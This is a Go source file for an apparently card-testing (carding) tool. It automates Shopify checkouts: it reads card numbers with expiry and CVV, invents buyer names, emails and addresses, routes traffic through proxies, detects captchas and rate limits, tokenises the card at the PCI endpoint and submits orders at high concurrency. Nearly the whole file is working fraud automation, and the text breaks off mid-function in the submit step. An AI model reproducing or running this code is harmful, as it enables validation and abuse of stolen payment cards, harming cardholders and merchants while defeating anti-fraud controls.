package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

// ==========================================
// CONFIGURATION
// ==========================================

const (
	PER_USER_CONCURRENT   = 500
	GLOBAL_MAX_CONCURRENT = 1500
	MAX_POLL_ATTEMPTS     = 4
	POLL_BASE_DELAY_MS    = 400
)

var C2C = map[string]string{
	"USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE", "HKD": "HK", "GBP": "GB",
	"CHF": "CH", "EUR": "DE", "AUD": "AU", "NZD": "NZ", "JPY": "JP", "SGD": "SG",
	"SEK": "SE", "NOK": "NO", "DKK": "DK", "PLN": "PL", "CZK": "CZ", "MXN": "MX",
	"BRL": "BR", "KRW": "KR", "THB": "TH", "MYR": "MY", "PHP": "PH", "IDR": "ID",
	"TWD": "TW", "ZAR": "ZA", "ILS": "IL", "TRY": "TR", "SAR": "SA", "QAR": "QA",
	"KWD": "KW", "CNY": "CN", "HUF": "HU", "RON": "RO", "BGN": "BG", "CLP": "CL",
	"COP": "CO", "PEN": "PE", "ARS": "AR",
}

type Address struct {
	Address1, City, PostalCode, ZoneCode, CountryCode, Phone string
}

var Book = map[string]Address{
	"US":      {"123 Main", "New York", "10080", "NY", "US", "2194157586"},
	"CA":      {"88 Queen", "Toronto", "M5J2J3", "ON", "CA", "4165550198"},
	"GB":      {"221B Baker Street", "London", "NW1 6XE", "LND", "GB", "2079460123"},
	"DEFAULT": {"123 Main", "New York", "10080", "NY", "US", "2194157586"},
}

func pickAddr(siteURL string) Address {
	u, err := url.Parse(normalizeDomain(siteURL))
	if err == nil {
		parts := strings.Split(u.Hostname(), ".")
		tld := strings.ToUpper(parts[len(parts)-1])
		if addr, ok := Book[tld]; ok {
			return addr
		}
	}
	return Book["DEFAULT"]
}

// ==========================================
// HIGH-PERFORMANCE HTTP ENGINE
// ==========================================

var GlobalClient *http.Client

func init() {
	GlobalClient = &http.Client{
		Transport: &http.Transport{
			MaxIdleConns:        10000,
			MaxIdleConnsPerHost: 500,
			IdleConnTimeout:     90 * time.Second,
			TLSHandshakeTimeout: 5 * time.Second,
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
			DisableCompression:  true,
			ForceAttemptHTTP2:   true,
		},
		Timeout: 30 * time.Second,
	}
}

func getProxyClient(proxyStr string) (*http.Client, error) {
	if proxyStr == "" {
		return GlobalClient, nil
	}
	proxyURL, err := parseProxy(proxyStr)
	if err != nil || proxyURL == nil {
		return nil, fmt.Errorf("invalid proxy format")
	}
	return &http.Client{
		Transport: &http.Transport{
			Proxy:               http.ProxyURL(proxyURL),
			MaxIdleConns:        100,
			MaxIdleConnsPerHost: 10,
			IdleConnTimeout:     30 * time.Second,
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
			DisableCompression:  true,
		},
		Timeout: 30 * time.Second,
	}, nil
}

func parseProxy(raw string) (*url.URL, error) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return nil, nil
	}
	if !strings.Contains(raw, "://") {
		parts := strings.Split(raw, ":")
		switch len(parts) {
		case 2:
			raw = "http://" + raw
		case 4:
			if _, err := strconv.Atoi(parts[1]); err == nil {
				raw = fmt.Sprintf("http://%s:%s@%s:%s", parts[2], parts[3], parts[0], parts[1])
			} else {
				raw = fmt.Sprintf("http://%s:%s@%s:%s", parts[0], parts[1], parts[2], parts[3])
			}
		default:
			raw = "http://" + raw
		}
	}
	return url.Parse(raw)
}

func doReq(ctx context.Context, client *http.Client, method, reqURL string, headers map[string]string, body io.Reader) ([]byte, int, error) {
	req, err := http.NewRequestWithContext(ctx, method, reqURL, body)
	if err != nil {
		return nil, 0, err
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil, 0, err
	}
	defer resp.Body.Close()
	data, err := io.ReadAll(resp.Body)
	return data, resp.StatusCode, err
}

// ==========================================
// ZERO-ALLOCATION FAST JSON EXTRACTOR
// ==========================================

func fastExtract(data []byte, key string) []byte {
	search := []byte(`"` + key + `":`)
	idx := bytes.Index(data, search)
	if idx == -1 {
		return nil
	}
	start := idx + len(search)
	for start < len(data) && (data[start] == ' ' || data[start] == '\t' || data[start] == '\n' || data[start] == '\r') {
		start++
	}
	if start >= len(data) {
		return nil
	}
	if data[start] == '"' {
		end := start + 1
		for end < len(data) {
			if data[end] == '\\' {
				end += 2
				continue
			}
			if data[end] == '"' {
				return data[start+1 : end]
			}
			end++
		}
	} else if data[start] == '{' || data[start] == '[' {
		bracket := data[start]
		closeBracket := byte('}')
		if bracket == '[' {
			closeBracket = ']'
		}
		depth := 1
		end := start + 1
		for end < len(data) && depth > 0 {
			if data[end] == '"' {
				end++
				for end < len(data) && data[end] != '"' {
					if data[end] == '\\' {
						end++
					}
					end++
				}
			} else if data[end] == bracket {
				depth++
			} else if data[end] == closeBracket {
				depth--
			}
			end++
		}
		return data[start:end]
	} else {
		end := start
		for end < len(data) && data[end] != ',' && data[end] != '}' && data[end] != ']' {
			end++
		}
		return bytes.TrimSpace(data[start:end])
	}
	return nil
}

func fstr(data []byte, key string) string { return string(fastExtract(data, key)) }

// ==========================================
// UTILITIES
// ==========================================

var reUUID = regexp.MustCompile(`[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}`)

func extractBetween(text, start, end string) string {
	i := strings.Index(text, start)
	if i == -1 {
		return ""
	}
	i += len(start)
	j := strings.Index(text[i:], end)
	if j == -1 {
		return ""
	}
	return text[i : i+j]
}

func unescapeHTML(text string) string {
	r := strings.NewReplacer(
		"&quot;", `"`, "&#34;", `"`, "\u0022", `"`,
		"&#39;", `'`, "\u0027", `'`, "&amp;", `&`,
		`\\"`, `"`,
	)
	return r.Replace(text)
}

func extractStableID(text string) string {
	raw := unescapeHTML(text)
	val := extractBetween(raw, `"stableId":"`, `"`)
	if val != "" {
		return val
	}
	if match := reUUID.FindString(raw); match != "" {
		return match
	}
	return fmt.Sprintf("%08x-%04x-%04x-%04x-%012x", rand.Uint32(), rand.Uint32()&0xffff, rand.Uint32()&0xffff, rand.Uint32()&0xffff, rand.Uint64()&0xffffffffffff)
}

func getRandName() (string, string) {
	f := []string{"James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia"}
	l := []string{"Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"}
	return f[rand.Intn(len(f))], l[rand.Intn(len(l))]
}

func genEmail(first, last string) string {
	d := []string{"gmail.com", "yahoo.com", "outlook.com", "protonmail.com"}
	return fmt.Sprintf("%s.%s%d@%s", strings.ToLower(first), strings.ToLower(last), rand.Intn(9999), d[rand.Intn(len(d))])
}

func getRandStr(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func normalizeDomain(d string) string {
	if !strings.HasPrefix(d, "http") {
		d = "https://" + d
	}
	return strings.TrimSuffix(d, "/")
}

func extractCleanResponse(msg string) string {
	if msg == "" {
		return "UNKNOWN_ERROR"
	}
	upper := strings.ToUpper(msg)
	if strings.Contains(upper, "3DS_REQUIRED") || strings.Contains(upper, "OTP") ||
		strings.Contains(upper, "SCA_REQUIRED") || strings.Contains(upper, "AUTHENTICATION_REQUIRED") {
		return "3DS_REQUIRED"
	}
	re := regexp.MustCompile(`"code"\s*:\s*"([^"]+)"`)
	if m := re.FindStringSubmatch(msg); len(m) > 1 {
		return m[1]
	}
	msg = strings.TrimSpace(msg)
	if regexp.MustCompile(`^[A-Z][A-Z0-9_]+$`).MatchString(msg) {
		return msg
	}
	if len(msg) > 80 {
		return msg[:80]
	}
	return msg
}

func nonJSONResponseCode(status int, body []byte) string {
	text := strings.TrimSpace(string(body))
	if status == 429 || status == 430 || status == 503 {
		return "RATE_LIMITED"
	}
	if text == "" {
		return "RATE_LIMITED"
	}
	low := strings.ToLower(text[:minInt(300, len(text))])
	if strings.HasPrefix(low, "<!") || strings.HasPrefix(low, "<html") || strings.Contains(low, "<html") {
		if strings.Contains(low, "captcha") || strings.Contains(low, "challenge") {
			return "CAPTCHA_REQUIRED"
		}
		return "RATE_LIMITED"
	}
	if strings.Contains(low, "throttl") || strings.Contains(low, "too many") {
		return "RATE_LIMITED"
	}
	return "UNPARSEABLE_RESPONSE"
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func isCaptchaRequired(body []byte) bool {
	upper := strings.ToUpper(string(body))
	return strings.Contains(upper, "CAPTCHA_REQUIRED") || strings.Contains(upper, "HCAPTCHA")
}

func rejectNeedsTermAccept(codes []string) bool {
	for _, c := range codes {
		cu := strings.ToUpper(c)
		if strings.Contains(cu, "TAX_NEW_TAX") || strings.HasPrefix(cu, "DELIVERY") ||
			cu == "WAITING_PENDING_TERMS" || cu == "ORDER_TOTAL_CHANGED" ||
			cu == "PAYMENT_AMOUNT_CHANGED" || strings.Contains(cu, "MUST_BE_ACCEPTED") {
			return true
		}
	}
	return false
}

// ==========================================
// GRAPHQL QUERIES
// ==========================================

const QUERY_PROPOSAL = `query Proposal($sessionInput:SessionTokenInput!,$queueToken:String,$checkpointData:String,$delivery:DeliveryTermsInput,$merchandise:MerchandiseTermInput,$payment:PaymentTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,discounts:{lines:[],acceptUnexpectedDiscounts:true},payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes},checkpointData:$checkpointData,queueToken:$queueToken}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails}sellerProposal{...ProposalDetails}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage __typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone __typename}__typename}merchandise{...on FilledMerchandiseTerms{merchandiseLines{stableId merchandise{...on ProductVariantMerchandise{id digest variantId __typename}...on ContextualizedProductVariantMerchandise{id digest variantId __typename}__typename}__typename}__typename}__typename}fragment ProposalDetails on Proposal{merchandise{...on FilledMerchandiseTerms{merchandiseLines{stableId merchandise{...on ProductVariantMerchandise{id digest variantId __typename}...on ContextualizedProductVariantMerchandise{id digest variantId __typename}__typename}__typename}__typename}delivery{...on FilledDeliveryTerms{progressiveRatesEstimatedTimeUntilCompletion intermediateRates deliveryLines{destinationAddress{...on StreetAddress{handle __typename}__typename}selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}availableDeliveryStrategies{handle amount{value{amount currencyCode __typename}__typename}__typename}targetMerchandise{linesV2{merchandise{...on SourceProvidedMerchandise{requiresShipping __typename}...on ProductVariantMerchandise{requiresShipping __typename}...on ContextualizedProductVariantMerchandise{requiresShipping __typename}__typename}__typename}__typename}__typename}__typename}deliveryExpectations{...on FilledDeliveryExpectationTerms{deliveryExpectations{deliveryStrategyHandle signedHandle __typename}__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{paymentMethod{...on PaymentProvider{paymentMethodIdentifier name extensibilityDisplayName __typename}__typename}__typename}__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{value{amount __typename}__typename}totalTaxAmountV2{amount __typename}__typename}...on PendingTerms{pollDelay __typename}__typename}runningTotal{value{amount currencyCode __typename}__typename}checkoutTotal{value{amount currencyCode __typename}__typename}subtotalBeforeTaxesAndShipping{value{amount __typename}__typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 __typename}`

const MUTATION_SUBMIT = `mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{code localizedMessage nonLocalizedMessage __typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{__typename}__typename}__typename}__typename}`

const QUERY_POLL = `query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{__typename}__typename}__typename}__typename}`

// ==========================================
// CORE CHECKOUT ENGINE
// ==========================================

type CheckoutResult struct {
	Success  bool    `json:"Status"`
	Message  string  `json:"Response"`
	Gateway  string  `json:"Gateway"`
	Price    float64 `json:"Price"`
	Currency string  `json:"Currency"`
	Proxy    string  `json:"Proxy"`
	Time     string  `json:"Time"`
	CC       string  `json:"cc"`
}

func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, proxyStr string) CheckoutResult {
	startTime := time.Now()
	res := CheckoutResult{Currency: "USD", Proxy: "Not Used", Gateway: "UNKNOWN", CC: cc + "|" + mes + "|" + ano + "|" + cvv}

	client, err := getProxyClient(proxyStr)
	if err != nil {
		res.Message = "Invalid proxy format"
		res.Proxy = "Dead"
		return res
	}
	if proxyStr != "" {
		res.Proxy = "Live"
	}

	baseURL := normalizeDomain(siteURL)
	addr := pickAddr(baseURL)
	fName, lName := getRandName()
	email := genEmail(fName, lName)

	headers := map[string]string{
		"User-Agent":       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Accept":           "application/json, text/plain, */*",
		"Accept-Language":  "en-US,en;q=0.9",
		"Content-Type":     "application/json",
		"Origin":           baseURL,
		"Referer":          baseURL + "/",
		"sec-ch-ua":        `"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"`,
		"sec-ch-ua-mobile": "?0",
		"sec-ch-ua-platform": `"Windows"`,
	}

	// Step 2: Cart Permalink → Checkout Session
	cartURL := fmt.Sprintf("%s/cart/%s:1", baseURL, variantID)
	cartHeaders := map[string]string{
		"User-Agent":     headers["User-Agent"],
		"Accept":         "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"sec-fetch-dest": "document",
		"sec-fetch-mode": "navigate",
		"sec-fetch-site": "same-origin",
		"sec-fetch-user": "?1",
	}

	body, status, err := doReq(ctx, client, "GET", cartURL, cartHeaders, nil)
	if err != nil || (status != 200 && status != 302) {
		res.Message = "Cart permalink failed"
		if proxyStr != "" {
			res.Proxy = "Dead"
		}
		return res
	}

	text := string(body)
	checkoutURL := baseURL + "/checkouts/cn/" + getRandStr(32)
	if loc := extractBetween(text, `<meta http-equiv="refresh" content="0;url=`, `"`); loc != "" {
		checkoutURL = loc
	}

	sst := extractBetween(text, `name="serialized-sessionToken" content="&quot;`, `&quot;`)
	if sst == "" {
		sst = extractBetween(text, `"serializedSessionToken":"`, `"`)
	}
	queueToken := extractBetween(unescapeHTML(text), `"queueToken":"`, `"`)
	stableID := extractStableID(text)
	merch := extractBetween(text, `ProductVariantMerchandise/`, `&quot;`)
	if merch == "" {
		merch = extractBetween(unescapeHTML(text), `ProductVariantMerchandise/`, `"`)
	}
	if merch == "" {
		merch = variantID
	}
	currency := extractBetween(text, `currencyCode&quot;:&quot;`, `&quot;`)
	if currency == "" {
		currency = extractBetween(unescapeHTML(text), `"currencyCode":"`, `"`)
	}
	if currency == "" {
		currency = "USD"
	}

	attemptToken := extractBetween(checkoutURL, `/checkouts/cn/`, `/`)
	if attemptToken == "" {
		attemptToken = extractBetween(checkoutURL, `/checkouts/c/`, `/`)
	}
	if attemptToken == "" {
		attemptToken = getRandStr(32)
	}

	buildID := ""
	reBuild := regexp.MustCompile(`"commitSha"\s*:\s*"([a-f0-9]{40})"`)
	if m := reBuild.FindStringSubmatch(unescapeHTML(text)); len(m) > 1 {
		buildID = m[1]
	}

	sourceToken := extractBetween(text, `name="serialized-sourceToken" content="`, `"`)
	if sourceToken == "" {
		reSrc := regexp.MustCompile(`checkoutWebSourceId":"([^"]+)"`)
		if m := reSrc.FindStringSubmatch(unescapeHTML(text)); len(m) > 1 {
			sourceToken = m[1]
		}
	}

	pciURL := "https://checkout.pci.shopifyinc.com/sessions"
	rePCI := regexp.MustCompile(`checkoutCardsinkUrl":"([^"]+)"`)
	if m := rePCI.FindStringSubmatch(unescapeHTML(text)); len(m) > 1 {
		pciURL = strings.TrimSuffix(m[1], "/") + "/sessions"
	}

	identSig := ""
	reIdent := regexp.MustCompile(`checkoutCardsinkCallerIdentificationSignature":"([^"]+)"`)
	if m := reIdent.FindStringSubmatch(unescapeHTML(text)); len(m) > 1 {
		identSig = m[1]
	}

	if sst == "" {
		low := strings.ToLower(text)
		if strings.Contains(low, "password") && (strings.Contains(low, "enter") || strings.Contains(low, "store")) {
			res.Message = "Site is password protected"
			return res
		}
		if status == 429 || status == 430 || status == 503 {
			res.Message = "RATE_LIMITED"
			return res
		}
		res.Message = "CHECKOUT_SESSION_FAILED"
		return res
	}

	headers["shopify-checkout-client"] = "checkout-web/1.0"
	headers["shopify-checkout-source"] = fmt.Sprintf(`id="%s", type="cn"`, attemptToken)
	headers["x-checkout-one-session-token"] = sst
	headers["sec-fetch-dest"] = "empty"
	headers["sec-fetch-mode"] = "cors"
	headers["sec-fetch-site"] = "same-origin"
	if buildID != "" {
		headers["x-checkout-web-build-id"] = buildID
		headers["x-checkout-web-deploy-stage"] = "production"
	}
	if sourceToken != "" {
		headers["x-checkout-web-source-id"] = sourceToken
	}

	u, _ := url.Parse(checkoutURL)
	graphqlURL := fmt.Sprintf("https://%s/checkouts/unstable/graphql", u.Host)

	billingAddr := map[string]interface{}{
		"streetAddress": map[string]string{
			"address1": addr.Address1, "city": addr.City, "countryCode": addr.CountryCode,
			"postalCode": addr.PostalCode, "firstName": fName, "lastName": lName,
			"zoneCode": addr.ZoneCode, "phone": addr.Phone,
		},
	}

	variables := map[string]interface{}{
		"sessionInput": map[string]string{"sessionToken": sst},
		"queueToken":   queueToken,
		"discounts":    map[string]interface{}{"lines": []interface{}{}, "acceptUnexpectedDiscounts": true},
		"delivery": map[string]interface{}{
			"deliveryLines": []map[string]interface{}{{
				"destination":            map[string]interface{}{"partialStreetAddress": billingAddr["streetAddress"]},
				"targetMerchandiseLines": map[string]interface{}{"any": true},
				"deliveryMethodTypes":    []string{"SHIPPING"},
				"expectedTotalPrice":     map[string]interface{}{"any": true},
				"destinationChanged":     true,
			}},
			"noDeliveryRequired": []interface{}{},
		},
		"merchandise": map[string]interface{}{
			"merchandiseLines": []map[string]interface{}{{
				"stableId": stableID,
				"merchandise": map[string]interface{}{
					"productVariantReference": map[string]interface{}{
						"id":        fmt.Sprintf("gid://shopify/ProductVariantMerchandise/%s", merch),
						"variantId": fmt.Sprintf("gid://shopify/ProductVariant/%s", variantID),
					},
				},
				"quantity":           map[string]interface{}{"items": map[string]int{"value": 1}},
				"expectedTotalPrice": map[string]interface{}{"any": true},
			}},
		},
		"payment": map[string]interface{}{
			"totalAmount":    map[string]interface{}{"any": true},
			"paymentLines":   []interface{}{},
			"billingAddress": billingAddr,
		},
		"buyerIdentity": map[string]interface{}{
			"customer":     map[string]string{"presentmentCurrency": currency, "countryCode": addr.CountryCode},
			"email":        email,
			"emailChanged": false,
			"rememberMe":   false,
		},
		"taxes": map[string]interface{}{
			"proposedTotalAmount": map[string]interface{}{"value": map[string]string{"amount": "0", "currencyCode": currency}},
		},
	}

	payload, _ := json.Marshal(map[string]interface{}{
		"query":         QUERY_PROPOSAL,
		"variables":     variables,
		"operationName": "Proposal",
	})

	// Step 3: Proposal
	body, status, err = doReq(ctx, client, "POST", graphqlURL+"?operationName=Proposal", headers, bytes.NewReader(payload))
	if err != nil {
		res.Message = "Proposal request failed"
		return res
	}
	if isCaptchaRequired(body) {
		res.Message = "CAPTCHA_REQUIRED"
		return res
	}
	if status == 429 || status == 430 || status == 503 {
		res.Message = nonJSONResponseCode(status, body)
		return res
	}

	resultType := fstr(body, "__typename")
	if resultType == "CheckpointDenied" || resultType == "Throttled" || resultType == "NegotiationResultFailed" {
		res.Message = resultType
		return res
	}

	checkpointData := fstr(body, "checkpointData")
	if qt := fstr(body, "queueToken"); qt != "" {
		queueToken = qt
	}

	totalPrice := fstr(fastExtract(body, "checkoutTotal"), "amount")
	if totalPrice == "" {
		totalPrice = fstr(fastExtract(body, "runningTotal"), "amount")
	}
	if p, err := strconv.ParseFloat(totalPrice, 64); err == nil {
		res.Price = p
	}

	deliveryStrategy := fstr(fastExtract(body, "selectedDeliveryStrategy"), "handle")
	if deliveryStrategy == "" {
		strats := fastExtract(body, "availableDeliveryStrategies")
		if strats != nil {
			deliveryStrategy = fstr(strats, "handle")
		}
	}

	signedHandle := ""
	delExp := fastExtract(body, "deliveryExpectations")
	if delExp != nil {
		exps := fastExtract(delExp, "deliveryExpectations")
		if exps != nil {
			signedHandle = fstr(exps, "signedHandle")
		}
	}

	paymentIdentifier := ""
	gatewayName := ""
	payLines := fastExtract(body, "availablePaymentLines")
	if payLines != nil {
		pm := fastExtract(payLines, "paymentMethod")
		if pm != nil {
			paymentIdentifier = fstr(pm, "paymentMethodIdentifier")
			gatewayName = fstr(pm, "extensibilityDisplayName")
			if gatewayName == "" {
				gatewayName = fstr(pm, "name")
			}
		}
	}
	if gatewayName != "" {
		res.Gateway = gatewayName
	}
	if paymentIdentifier == "" {
		res.Message = "No valid payment method found"
		return res
	}

	taxAmount := "0"
	taxObj := fastExtract(body, "tax")
	if taxObj != nil {
		if ta := fstr(taxObj, "amount"); ta != "" {
			taxAmount = ta
		} else if tv := fastExtract(taxObj, "value"); tv != nil {
			if ta := fstr(tv, "amount"); ta != "" {
				taxAmount = ta
			}
		}
	}

	scriptFP := fastExtract(body, "scriptFingerprint")
	transformerFP := fstr(body, "transformerFingerprintV2")

	// Step 4: Confirm Delivery
	if deliveryStrategy != "" {
		variables["delivery"].(map[string]interface{})["deliveryLines"].([]map[string]interface{})[0]["selectedDeliveryStrategy"] = map[string]interface{}{
			"deliveryStrategyByHandle": map[string]interface{}{"handle": deliveryStrategy, "customDeliveryRate": false},
			"options":                  map[string]string{},
		}
		variables["delivery"].(map[string]interface{})["deliveryLines"].([]map[string]interface{})[0]["targetMerchandiseLines"] = map[string]interface{}{"lines": []map[string]string{{"stableId": stableID}}}
		variables["delivery"].(map[string]interface{})["deliveryLines"].([]map[string]interface{})[0]["destinationChanged"] = false
	}
	variables["taxes"] = map[string]interface{}{
		"proposedTotalAmount": map[string]interface{}{"any": true},
	}

	payload, _ = json.Marshal(map[string]interface{}{"query": QUERY_PROPOSAL, "variables": variables, "operationName": "Proposal"})
	body, _, err = doReq(ctx, client, "POST", graphqlURL+"?operationName=Proposal", headers, bytes.NewReader(payload))
	if err != nil {
		res.Message = "Delivery confirm failed"
		return res
	}
	if isCaptchaRequired(body) {
		res.Message = "CAPTCHA_REQUIRED"
		return res
	}

	if qt := fstr(body, "queueToken"); qt != "" {
		queueToken = qt
	}
	if cd := fstr(body, "checkpointData"); cd != "" {
		checkpointData = cd
	}
	if ds := fstr(fastExtract(body, "selectedDeliveryStrategy"), "handle"); ds != "" {
		deliveryStrategy = ds
	}
	if sh := fstr(fastExtract(fastExtract(body, "deliveryExpectations"), "signedHandle"), ""); sh != "" {
		signedHandle = sh
	}
	if tp := fstr(fastExtract(body, "checkoutTotal"), "amount"); tp != "" {
		if p, err := strconv.ParseFloat(tp, 64); err == nil {
			res.Price = p
		}
	}
	if ta := fstr(fastExtract(body, "tax"), "amount"); ta != "" {
		taxAmount = ta
	} else if tv := fastExtract(fastExtract(body, "tax"), "value"); tv != nil {
		if ta := fstr(tv, "amount"); ta != "" {
			taxAmount = ta
		}
	}
	if sf := fastExtract(body, "scriptFingerprint"); sf != nil {
		scriptFP = sf
	}
	if tf := fstr(body, "transformerFingerprintV2"); tf != "" {
		transformerFP = tf
	}

	// Progressive rate wait
	progETA := fstr(fastExtract(body, "delivery"), "progressiveRatesEstimatedTimeUntilCompletion")
	if progETA != "" {
		if ms, err := strconv.Atoi(progETA); err == nil && ms > 0 {
			delay := minInt(max(ms, 400), 2000)
			time.Sleep(time.Duration(delay) * time.Millisecond)
			payload, _ = json.Marshal(map[string]interface{}{"query": QUERY_PROPOSAL, "variables": variables, "operationName": "Proposal"})
			body, _, _ = doReq(ctx, client, "POST", graphqlURL+"?operationName=Proposal", headers, bytes.NewReader(payload))
			if qt := fstr(body, "queueToken"); qt != "" {
				queueToken = qt
			}
			if cd := fstr(body, "checkpointData"); cd != "" {
				checkpointData = cd
			}
			if ds := fstr(fastExtract(body, "selectedDeliveryStrategy"), "handle"); ds != "" {
				deliveryStrategy = ds
			}
			if ta := fstr(fastExtract(body, "tax"), "amount"); ta != "" {
				taxAmount = ta
			}
		}
	}

	// Step 5: PCI Tokenization
	pciPayload, _ := json.Marshal(map[string]interface{}{
		"credit_card": map[string]interface{}{
			"number": cc, "month": mes, "year": ano, "verification_value": cvv,
			"name": fmt.Sprintf("%s %s", fName, lName),
		},
		"payment_session_scope": u.Host,
	})
	pciHeaders := map[string]string{
		"Content-Type": "application/json",
		"Accept":       "application/json",
		"Origin":       "https://checkout.pci.shopifyinc.com",
		"Referer":      "https://checkout.pci.shopifyinc.com/",
		"User-Agent":   headers["User-Agent"],
	}
	if identSig != "" {
		pciHeaders["shopify-identification-signature"] = identSig
	}

	body, _, err = doReq(ctx, client, "POST", pciURL, pciHeaders, bytes.NewReader(pciPayload))
	if err != nil {
		res.Message = "PCI_TOKEN_FAILED"
		return res
	}
	pciToken := fstr(body, "id")
	if pciToken == "" {
		res.Message = "PCI_TOKEN_FAILED"
		return res
	}

	// Step 6: Submit
	submitAttemptToken := fmt.Sprintf("%s-%s", attemptToken, getRandStr(11))
	submitVars := map[string]interface{}{
		"input": map[string]interface{}{
			"sessionInput":   map[string]string{"sessionToken": sst},
			"queueToken":     queueToken,
			"checkpointData": checkpointData,
			"discounts":      map[string]interface{}{"lines": []interface{}{}, "acceptUnexpectedDiscounts": true},
			"delivery": map[string]interface{}{
				"deliveryLines": []map[string]interface{}{{
					"destination": map[string]interface{}{"streetAddress": billingAddr["streetAddress"]},
					"selectedDeliveryStrategy": map[string]interface{}{
						"deliveryStrategyByHandle": map[string]interface{}{"handle": deliveryStrategy, "customDeliveryRate": false},
						"options":                  map[string]string{"phone": addr.Phone},
					},
					"targetMerchandiseLines": map[string]interface{}{"lines": []map[string]string{{"stableId": stableID}}},
					"deliveryMethodTypes":    []string{"SHIPPING"},
					"expectedTotalPrice":     map[string]interface{}{"any": true},
					"destinationChanged":     false,
				}},
				"noDeliveryRequired":    []interface{}{},
				"useProgressiveRates":   true,
				"supportsSplitShipping": true,
			},
			"deliveryExpectations": map[string]interface{}{
				"deliveryExpectationLines": func() []map[string]string {
					if signedHandle != "" {
						return []map[string]string{{"signedHandle": signedHandle}}
					}
					return []map[string]string{}
				}(),
			},
			"merchandise": variables["merchandise"],
			"payment": map[string]interface{}{
				"totalAmount": map[string]interface{}{"any": true},
				"paymentLines": []map[string]interface{}{{
					"paymentMethod": map[string]interface{}{
						"directPaymentMethod": map[string]interface{}{
							"paymentMethodIdentifier": paymentIdentifier,
							"sessionId":               pciToken,
							"billingAddress":          billingAddr,
						},
					},
					"amount": map[string]interface{}{"any": true},
				}},
				"billingAddress": billingAddr,
			},
			"buyerIdentity": variables["buyerIdentity"],
			"taxes": map[string]interface{}{
				"proposedTotalAmount": map[string]interface{}{"value": map[string]string{"amount": taxAmount, "currencyCode": currency}},
			},
			"optionalDuties": map[string]interface{}{"buyerRefusesDuties": false},
		},
		"attemptToken": submitAttemptToken,
		"analytics":    map[string]string{"requestUrl": checkoutURL},
	}
	if scriptFP != nil {
		submitVars["input"].(map[string]interface{})["scriptFingerprint"] = json.RawMessage(scriptFP)
	}
	if transformerFP != "" {
		submitVars["input"].(map[string]interface{})["transformerFingerprintV2"] = transformerFP
	}

	submitPayload, _ := json.Marshal(map[string]interface{}{
		"query":         MUTATION_SUBMIT,
		"variables":     submitVars,
		"operationName": "SubmitForCompletion",
	})

	body, _, err = doReq(ctx, client, "POST", graphqlURL+"?operationName=SubmitForCompletion", headers, bytes.NewReader(submitPayload))
	if err != nil {
		res.Message = "Submit failed"
		return res
	}
	if isCaptchaRequired(body) {
		res.Message = "CAPTCHA_REQUIRED"
